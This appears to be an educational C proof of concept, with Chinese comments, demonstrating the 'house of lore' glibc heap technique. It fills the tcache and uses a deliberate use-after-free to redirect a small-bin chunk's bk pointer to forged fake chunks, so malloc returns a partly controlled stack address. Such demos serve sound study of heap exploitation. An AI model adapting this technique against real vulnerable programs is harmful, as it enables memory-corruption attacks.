/**
 *  漏洞名称： house of lore
 *  适用版本： glibc-2.23 ~ glibc-2.39
 *  漏洞危害： 分配出一块部分可控的地址
 *  复现环境： Ubuntu 22.04
 *  编译命令： gcc -g house_of_lore.c -o house_of_lore
 */

/**
 *  利用条件：存在UAF漏洞
 *  利用思路: 将一块chunk放入small bin中，利用UAF漏洞修改smallchunk的bk指向fakechunk，然后分配出fakechunk即可分配出一块部分可控的地址
 */
#define DEMO
#include <demo.h>

int main()
{
    u64 fakechunk[0x100];

    dm_std_init();

    printf("创建一个chunk用来放入small bin\n");
    u64 smallchunk = MALLOC(0x100);

    printf("创建7个chunk用于填充tcache bin\n");
    u64 tcache[7];
    for (int i = 0; i < 7; i++)
    {
        tcache[i] = MALLOC(0x100);
    }

    printf("1.填充tcache bin\n");
    for (int i = 0; i < 7; i++)
    {
        FREE(tcache[i]);
    }

    printf("2.将smallchunk放入small bin中\n");
    FREE(smallchunk);
    MALLOC(0x200);

    printf("3.构造fakechunk\n");
    fakechunk[0] = 0; // fakechunk1
    fakechunk[1] = 0;
    fakechunk[2] = GET_VALUE(smallchunk - 0x10);
    fakechunk[3] = GET_VALUE(&fakechunk[4]);
    fakechunk[4] = 0; // fakechunk2
    fakechunk[5] = 0;
    fakechunk[6] = 0; // fakechunk3
    fakechunk[7] = GET_VALUE(&fakechunk[6]);
    fakechunk[8] = 0; // fakechunk4
    fakechunk[9] = GET_VALUE(&fakechunk[8]);
    fakechunk[10] = 0; // fakechunk5
    fakechunk[11] = GET_VALUE(&fakechunk[10]);
    fakechunk[12] = 0; // fakechunk6
    fakechunk[13] = GET_VALUE(&fakechunk[12]);
    fakechunk[14] = 0; // fakechunk7
    fakechunk[15] = GET_VALUE(&fakechunk[14]);
    fakechunk[16] = 0; // fakechunk8
    fakechunk[17] = GET_VALUE(&fakechunk[16]);

    printf("4.修改smallchunk的bk指向fakechunk\n");
    SET_ADDR_OFFSET_VALUE(smallchunk, 0x8, &fakechunk[0]);

    printf("5.分配出fakechunk，先处理tcache bin中的chunk，然后第二次malloc即可分配出\n");
    for (int i = 0; i < 7; i++)
    {
        MALLOC(0x100);
    }
    PUT_VALUE("第一次 malloc 出 smallchunk", MALLOC(0x100));
    PUT_VALUE("第二次 malloc 出我们需要的地址", MALLOC(0x100));
    PUT_VALUE("fakechunk[16]", &fakechunk[16]); // fakechunk7

    return 0;
}